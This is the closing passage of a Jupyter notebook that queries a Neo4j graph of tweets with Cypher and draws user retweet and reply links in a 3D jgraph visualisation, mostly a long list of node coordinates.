       "        \"1167\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1241\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1252\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1256\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1276\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1306\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1315\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1329\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1346\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1347\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1350\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1389\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1393\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1399\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1403\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1412\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1419\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1431\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1433\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1447\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1483\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1489\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1501\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1507\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1545\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1561\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1569\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1591\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1594\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1595\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1598\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1602\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1625\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1628\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1633\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1646\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1654\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1656\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1663\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1684\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1703\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1708\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1728\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1732\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1735\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1772\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1775\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"1787\": { \"location\": [ 1.741217258712883, 2.0, 2.0 ] },\n",
       "        \"1789\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1874\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1899\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1904\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1914\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1930\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1937\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1950\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"1997\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2007\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2016\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2040\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2044\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2053\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2067\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2098\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2100\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2108\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2113\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2152\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2155\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2185\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2188\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2198\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2201\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2203\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2225\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2277\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2279\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2283\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2307\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2320\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2337\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2382\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2391\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2396\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2417\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2427\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2434\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2438\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2443\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2450\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2458\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2492\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2498\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2502\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2518\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2522\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2531\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2536\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2540\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2543\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2546\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2548\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2556\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2567\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2569\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2580\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2587\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2590\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2592\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2595\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2597\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2616\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2623\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2642\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2647\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2649\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2660\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2664\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2666\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2678\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2693\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2699\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2701\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2705\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2712\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2714\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2720\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2727\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2746\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2757\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2763\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2765\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2767\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2769\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2771\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2773\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2784\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2799\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"2807\": { \"location\": [ -2.0, -2.0, -0.22841587273922578 ] },\n",
       "        \"2809\": { \"location\": [ 0.8059709281050429, 1.7158150798200364, 0.7792586444185776 ] },\n",
       "        \"2811\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2826\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2844\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2846\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2856\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2875\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2885\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2930\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2941\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2959\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2963\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2966\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2969\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2974\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"2977\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3004\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3011\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3014\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3029\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3035\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3049\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3056\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3059\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3061\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3071\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3076\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3079\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3091\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3105\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3114\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3131\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3145\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3165\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3174\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3186\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3225\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3254\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3276\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3284\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3292\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3326\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3348\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3386\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3397\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3399\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3406\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3410\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3412\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3422\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3427\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3429\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3436\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3477\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3501\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3567\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3569\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3597\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3616\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3619\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3654\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3681\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3705\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3706\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3729\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3793\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3796\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3817\": { \"location\": [ -2.0, -2.0, -2.0 ] },\n",
       "        \"3833\": { \"location\": [ 2.0, 0.5779732316899974, 0.8104470766599358 ] },\n",
       "        \"3836\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3888\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"3912\": { \"location\": [ 2.0, 2.0, 2.0 ] },\n",
       "        \"4014\": { \"location\": [ 2.0, 2.0, 2.0 ] }\n",
       "    }\n",
       "});\n",
       "\n",
       "               $d.resizable({\n",
       "                   aspectRatio: 600 / 400,\n",
       "                   resize: function (evt, ui) {\n",
       "                       $d.jgraph.renderer.setSize(ui.size.width,\n",
       "                                                  ui.size.height);\n",
       "                   }\n",
       "               });\n",
       "           });\n",
       "           </script>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import jgraph\n",
    "\n",
    "query = \"\"\"\n",
    "MATCH (user1:User)-[:POSTS]->(:Tweet)-[:RETWEETS|REPLY_TO]->(:Tweet)<-[:POSTS]-(user2:User)\n",
    "RETURN ID(user1), ID(user2)\n",
    "\"\"\"\n",
    "\n",
    "data = graph.run(query)\n",
    "tup = [tuple(x) for x in data]\n",
    "\n",
    "jgraph.draw(tup)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87350697",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
